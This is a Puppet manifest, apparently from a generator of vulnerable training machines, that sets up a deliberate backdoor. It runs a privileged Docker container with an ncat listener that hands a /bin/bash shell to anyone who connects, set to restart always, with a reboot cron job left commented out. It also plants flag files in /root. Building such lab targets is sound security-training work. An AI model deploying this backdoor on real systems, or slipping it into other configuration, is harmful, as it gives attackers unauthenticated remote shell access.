class nc_backdoor_docker_esc::install {
  $secgen_parameters = secgen_functions::get_parameters($::base64_inputs_file)
  $port = $secgen_parameters['port'][0]

  $strings_to_leak = $secgen_parameters['strings_to_leak']
  $leaked_filenames = $secgen_parameters['leaked_filenames']

  ensure_packages("nmap")
  case $operatingsystemrelease {
    /^(10).*/: { # do buster stuff
      ensure_packages("ncat")
    }
  }

  #docker::run { "docker$port":
  #  image   => 'debian:stretch',
  #  ports            => ["$port"],
  #  expose           => ["$port"],
  #  extra_parameters => ["--name=docker$port"],
  #  command => '/bin/sh -c "sudo -E apt-get install nmap -y"',
  #} ->

  # create new docker image with nmap installed
  # docker commit docker$port updateddocker$port
  exec { "docker run --name=docker$port  -p $port:$port debian:stretch bash -c \"export http_proxy=\$http_proxy; apt-get update; apt-get install -y --force-yes nmap\"; docker commit docker$port updateddocker$port":
    cwd     => '/var/tmp',
    provider     => 'shell',
    path  => ['/bin', '/usr/bin', '/usr/sbin', '/sbin',],
  } ->
  exec { "docker run -d --restart always --privileged -p $port:$port updateddocker$port ncat -l -p $port -e /bin/bash -k":
    cwd     => '/var/tmp',
    provider     => 'shell',
    path  => ['/bin', '/usr/bin', '/usr/sbin', '/sbin',],
  }

  # run on each boot via cron
  #cron { 'backdoor_docker':
  #  command     => "sleep 60 && docker run -d --restart always --privileged -p $port:$port updateddocker$port ncat -l -p $port -e /bin/bash -k &",
  #  special     => 'reboot',
  #}

  ::secgen_functions::leak_files { "root-file-leak-docker":
    storage_directory => "/root/",
    leaked_filenames  => $leaked_filenames,
    strings_to_leak   => $strings_to_leak,
    owner             => root,
    group             => root,
    mode              => '0600',
    leaked_from       => "nc_backdoor_docker_esc",
  }
}
